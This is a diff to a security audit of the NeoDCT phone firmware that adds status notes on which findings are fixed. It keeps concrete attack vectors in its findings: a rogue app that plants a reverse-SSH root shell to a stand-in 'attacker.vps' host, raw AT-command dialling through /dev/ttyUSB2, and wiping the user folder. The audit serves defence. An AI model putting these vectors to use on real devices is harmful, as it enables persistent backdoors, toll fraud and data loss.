@@ -15,6 +15,16 @@ numbers are the ones to re-check after a big refactor, not the findings.
 
 ---
 
+**Since this was written, much of it has been fixed.** `SECURITY-PLAN.md`
+section 7 records exactly what, and the findings table in section 9 below
+carries a status column. This document is still a measurement of the state it
+was taken in and has NOT been rewritten to describe the present — a
+measurement that gets edited to match later work stops being evidence of
+anything. Where a section has been addressed it is marked in place, with what
+changed and what is left; where it has not, the finding stands as written.
+
+---
+
 ## 0. The one-paragraph verdict
 
 The **process architecture is right** and is the hard part — apps are separate
@@ -30,6 +40,14 @@ The second finding is more specific and more urgent than the general one:
 is read from the writable partition and the initramfs applier checks no
 signature. `SECURITY.md` claimed the phone "cannot be permanently backdoored
 through the update path". That claim was wrong and has been removed.
+
+> **Since fixed.** The initramfs carries its own verifier and the release key,
+> checks `manifest.sig` over `manifest.json` before anything reaches `dd`, and
+> then compares every field of `pending.prop` against the signed manifest —
+> because the attack is a genuine package with a rewritten record. The verdict
+> above holds for everything else in this section: two users now exist and the
+> browser is one of them, but nd-core is still root and there is still no
+> permission field.
 
 ---
 
@@ -62,6 +80,12 @@ requires undoing work.
 
 ### 2.1 There is no confinement primitive in the image at all
 
+> **Partly addressed.** There are now two users, a mode-bit layout on the
+> writable partition, `no_new_privs`, and a mount namespace with hidden paths
+> for untrusted children — `nd_priv.c`, `nd_proc.c`, `S00userdata`. The kernel
+> fragment names `SQUASHFS_XATTR`, `MNT_NS` and `SECCOMP_FILTER`. No seccomp
+> filter is installed yet and there is no MAC.
+
 ```
 $ grep -rn "setexeccon|landlock|seccomp|prctl|setuid|setgid|capset|unshare|CLONE_NEW" \
       neodct/src/ neodct/overlay/
@@ -74,6 +98,11 @@ names `CONFIG_DM_VERITY` and no other security option. Nothing enables
 xattrs — so even if a policy existed there is nowhere to put a label.
 
 ### 2.2 Everything runs as root, including things that need almost nothing
+
+> **Partly addressed.** netsurf-fb and everything it starts run as `ndusr_ut`,
+> which is not in `dialout` and not in group `ndusr`. nd-core, nd-apprun and
+> the apps are still root; `SECURITY-PLAN.md` section 7 says what stops the
+> core dropping.
 
 `inittab` runs `run_neodct.sh` on tty1, which execs `nd-core`, which forks
 `nd-apprun`, which `dlopen`s app code. Every one of those is uid 0. The
@@ -93,6 +122,12 @@ for a future `setexeccon()` to read.
 
 ### 2.4 The writable partition is mounted with no restrictions
 
+> **Fixed.** `nosuid,nodev` on the user partition, `/tmp`, `/dev/shm`, `/run`
+> and every card mount; `noexec` on the applier's card mount and on the card's
+> arrival partition. Not on `/tmp` or the user partition, deliberately: noexec
+> refuses `mmap(PROT_EXEC)` as well as `execve`, so it would break nd-apprun's
+> own `dlopen()` of `app.so`.
+
 ```
 initramfs/init:170     mount -t ext4 -o rw,noatime  $USER_DEV /mnt/user
 System/hw/neodct-sdcard:178   options="rw,noatime"
@@ -107,6 +142,13 @@ escalation from a card someone plugs in, so it is worth fixing *before* the user
 exists rather than after.
 
 ### 2.5 The browser has the whole filesystem
+
+> **Partly addressed.** The browser runs as `ndusr_ut`, its `HOME` moved off
+> the root of the writable partition into `/NeoDCT/User/browser`, and a mount
+> namespace gives it an empty view of `/NeoDCT/System/engineering` and the
+> rest of the list in `apps/Browser/browser.h`. The `file` fetcher is still
+> built, and the rest of `/NeoDCT/System` is still readable — it has to be, it
+> is where the home page lives.
 
 NetSurf is built with the `file` fetcher unconditionally
 (`netsurf/content/fetchers/Makefile:14`), so `file:///` enumerates the rootfs,
@@ -187,6 +229,24 @@ Write two files under `/NeoDCT/User/.ndsys/` and reboot. The 8 MiB user
 partition on the Luckfox is too small for a 51 MiB image, but the `package=`
 branch installs **straight off the SD card**, and a rogue app can write a card.
 
+> **Fixed, by (1).** `nd-verify` — a statically linked RSA verifier built from
+> the same `nd_signing.c` the Update app uses — and the release public key are
+> packed into the initramfs by `mkinitramfs.py`, which fails the build without
+> either of them exactly as it fails without `dmsetup`. `apply_pending` checks
+> `manifest.sig` over `manifest.json` before anything reaches `dd`.
+>
+> The signature alone would not have been enough, and that is worth recording:
+> the attack in this section is a GENUINE package with a rewritten record, so
+> that the applier writes a real image and then records an attacker's root hash
+> to verify against forever. So every field the signature covers — `sha256`,
+> `version`, `platform`, `buildtime` and all four verity parameters — is
+> compared against the signed manifest, and a mismatch is a refusal.
+>
+> (2) is still the better fix and is still not done: it needs the release
+> certificate in the kernel keyring and `keyctl` in the initramfs. The note
+> below about a kernel not shipping in an `.ndsw` is why it should land before
+> the fleet grows.
+
 ### The fix, in increasing order of goodness
 
 1. **Verify the signature in the initramfs, before the `dd`.** The public key is
@@ -208,6 +268,11 @@ in an `.ndsw`** — so it needs to land before the fleet grows, not after.
 ### Q1 — Can a rogue app invoke AT commands?
 
 **Yes, trivially, and it does not even need libneodct.**
+
+> **Still yes for an app; no longer for the browser.** `ndusr_ut` is not in
+> group `dialout`, so `open("/dev/ttyUSB2")` from netsurf or anything it starts
+> is `EACCES`. An app is still root, so nothing changed there — nd-apprun does
+> not drop, and the permission field this section asks for is Phase 3.
 
 `open("/dev/ttyUSB2", O_RDWR)` then `write(fd, "ATD1900555xxxx;\r", 16)`. The
 core takes `flock(LOCK_EX)` on the port (`lib/nd_modem_at.c:291`) but **flock is
@@ -231,7 +296,12 @@ ordinary SQLite file with no access control.
 
 ### Q3 — Can a rogue app `rm -rf` your entire user folder?
 
-**Yes.** `/NeoDCT/User` is `rw` and the app is root. Contacts, messages, call
+**Yes.** `/NeoDCT/User` is `rw` and the app is root.
+
+> **Still yes for an app; no for the browser.** `/NeoDCT/User` is now 0751
+> `ndusr:ndusr` and the only thing `ndusr_ut` may write is
+> `/NeoDCT/User/browser`. The blast radius of a NetSurf RCE is that one
+> directory. An app still runs as root and this answer is unchanged for it. Contacts, messages, call
 log, wallpaper, settings, ssh keys — one `nftw()` call, or `unlink()` in a loop
 so it doesn't even need to `execve` anything.
 
@@ -265,9 +335,9 @@ five places.
 | # | Vector | Mechanism | Severity |
 | --- | --- | --- | --- |
 | 1 | `/NeoDCT/User/.remote/state.prop` | Write `enabled=1`, `host=attacker.vps`, drop an `id_ed25519`. `nd_main.c:367` calls `nd_rs_start_if_enabled()` on every boot; the phone opens a reverse-SSH tunnel out to the attacker with a root shell on the far end. Outbound over mobile data, so no inbound firewall matters. **Survives OTA updates**, because an update replaces only the rootfs. | **Critical** |
-| 2 | `/NeoDCT/User/env.sh` | `run_neodct.sh:42` **sources it as root on every boot**, by design, so a developer can set `NEODCT_T9=1`. Arbitrary shell, uid 0, before the UI starts. | **Critical** |
-| 3 | `/NeoDCT/User/.ndsys/pending.prop` | Section 3. Replaces the entire OS, permanently, verity-clean. | **Critical** |
-| 4 | `/NeoDCT/User/.remote/authorized_keys` | Add a key; it is honoured whenever sshd runs. Also loadable **from an SD card** (`nd_rs_card_file_names`, `lib/nd_remoteshell.c:111`) — so this one is reachable with physical access and no code execution at all. | High |
+| 2 | ~~`/NeoDCT/User/env.sh`~~ | **Closed.** Still sourced, but only when the kernel cmdline says `neodct.devenv=1` or the verity-covered rootfs carries `/etc/neodct-devenv` — neither of which a running system can write. Engineering mode is deliberately not accepted: it lives on the partition the attacker just wrote to. | ~~Critical~~ |
+| 3 | ~~`/NeoDCT/User/.ndsys/pending.prop`~~ | **Closed.** The initramfs verifies the release signature and compares every field of the record against the signed manifest before anything reaches `dd`. A forged record is a refusal; an unsigned image needs `neodct.unsigned=1` on the kernel cmdline. | ~~Critical~~ |
+| 4 | `/NeoDCT/User/.remote/authorized_keys` | Add a key; it is honoured whenever sshd runs. Also loadable **from an SD card** (`nd_rs_card_file_names`, `lib/nd_remoteshell.c:111`) — so this one is reachable with physical access and no code execution at all. Narrowed, not closed: `.remote` is 0700 `ndusr` and empty inside the browser's namespace, and the card path is the MEDIA partition, which the untrusted set cannot write. An app is still root. | High |
 | 5 | `/NeoDCT/User/settings.prop`, `keymap.json`, the databases | Not code execution, but permanent behavioural change the user cannot see. | Medium |
 
 Vector 2 is worth dwelling on: it is not a bug, it is a documented developer
@@ -485,22 +555,30 @@ line in the build's acceptance check.
 
 ## 9. Findings summary
 
-| # | Finding | Severity | Phase |
-| --- | --- | --- | --- |
-| 1 | Update applier verifies no signature; verity root hash is attacker-writable | **Critical** | 0 |
-| 2 | `.remote/state.prop` is a self-installing persistent reverse-shell backdoor | **Critical** | 0/1 |
-| 3 | `env.sh` sourced as root on every boot from writable storage | **Critical** | 0 |
-| 4 | Everything runs as root; no MAC, no seccomp, no capability drop | High | 1/2 |
-| 5 | Browser reads the entire filesystem via `file://`, as root (JS is already off) | High | 0 |
-| 6 | No permission model; manifests have no permission field | High | 3 |
-| 7 | Apps can drive the modem directly; `nd_svc` narrowness is unenforced | High | 2 |
-| 8 | `engineering_mode` is a writable flag unlocking shell, raw AT and Downgrade | Medium | 1 |
-| 9 | User partition, `/tmp`, `/dev/shm` and auto-mounted SD cards lack `nosuid,nodev,noexec` | Medium | 0 |
-| 10 | SMS text and SNTP replies parsed on the core's own threads | Low (High once MMS lands) | 3 |
-| 12 | SNTP accepts any reply without matching the origin timestamp; clock is a TLS validity input | Low | 0 |
-| 11 | squashfs built without xattrs, so labelling is impossible later | Low | 0 |
-| 13 | NetSurf pinned at 3.11 and forked, so its parsers cannot be bumped by a version change | Medium | 0 |
-| 14 | Hand-written parsers eat untrusted bytes and are never fuzzed; `nd_json.c` runs *before* signature verification | Medium | 0 |
+Status as of `SECURITY-PLAN.md` section 7. **Built** means implemented and
+covered by host tests; nothing here has been booted.
+
+| # | Finding | Severity | Phase | Status |
+| --- | --- | --- | --- | --- |
+| 1 | Update applier verifies no signature; verity root hash is attacker-writable | **Critical** | 0 | **Built.** The initramfs carries a verifier and the release key, and every field of `pending.prop` is compared against the signed manifest |
+| 2 | `.remote/state.prop` is a self-installing persistent reverse-shell backdoor | **Critical** | 0/1 | Partly. `.remote` is 0700 `ndusr` and hidden from the untrusted set. A trusted app still reaches it, because trusted apps share `ndusr` with nd-core — per-app users are what would close this |
+| 3 | `env.sh` sourced as root on every boot from writable storage | **Critical** | 0 | **Built.** Gated on the kernel cmdline or a rootfs marker, and deliberately not on engineering mode |
+| 4 | Everything runs as root; no MAC, no seccomp, no capability drop | High | 1/2 | **Mostly built.** Nothing runs as root except a four-verb broker: nd-core is `ndusr`, apps are `ndusr`/`ndusr_ut`. Group `disk` dropped. Still no MAC and no seccomp — seccomp on the broker is the cheapest remaining win |
+| 5 | Browser reads the entire filesystem via `file://`, as root (JS is already off) | High | 0 | Partly. Not as root, and a mount namespace empties the engineering tree and the databases for it. The `file` fetcher is still built |
+| 6 | No permission model; manifests have no permission field | High | 3 | Not started, deliberately — section 3 of the plan says doing it before the direct path is closed produces "a permission system that politely asks" |
+| 7 | Apps can drive the modem directly; `nd_svc` narrowness is unenforced | High | 2 | Partly. Nothing is root any more, but trusted apps share `ndusr` with nd-core and so inherit `dialout`. Untrusted apps cannot — no `dialout`, and no service socket either. Proven by `tests/pentest-apps/PentestSms` |
+| 8 | `engineering_mode` is a writable flag unlocking shell, raw AT and Downgrade | Medium | 1 | Open. It is now explicitly refused as a gate where a gate has to be trustworthy (`env.sh`, the unsigned-update hatch) |
+| 9 | User partition, `/tmp`, `/dev/shm` and auto-mounted SD cards lack `nosuid,nodev,noexec` | Medium | 0 | **Built**, with `noexec` where it belongs — the arrival partition and the boot-time card mount, not `/tmp` |
+| 10 | SMS text and SNTP replies parsed on the core's own threads | Low (High once MMS lands) | 3 | Open |
+| 12 | SNTP accepts any reply without matching the origin timestamp; clock is a TLS validity input | Low | 0 | Open |
+| 11 | squashfs built without xattrs, so labelling is impossible later | Low | 0 | **Built.** `CONFIG_SQUASHFS_XATTR`; mksquashfs was already storing them |
+| 13 | NetSurf pinned at 3.11 and forked, so its parsers cannot be bumped by a version change | Medium | 0 | Open. Its blast radius is smaller: a NetSurf RCE is now `ndusr_ut` in a mount namespace |
+| 14 | Hand-written parsers eat untrusted bytes and are never fuzzed; `nd_json.c` runs *before* signature verification | Medium | 0 | Open in the app. In the initramfs the order is now the other way round: the signature is checked first and nothing parses the manifest until it passes |
+
+One finding not in the original list, found while implementing: the SD card
+had no way to express ownership at all, because a FAT filesystem has none and
+mount options apply to a whole filesystem. Section 1 Option C of the plan is
+the answer and it is built — a NeoDCT card is two FAT32 partitions now.
 
 ---
 
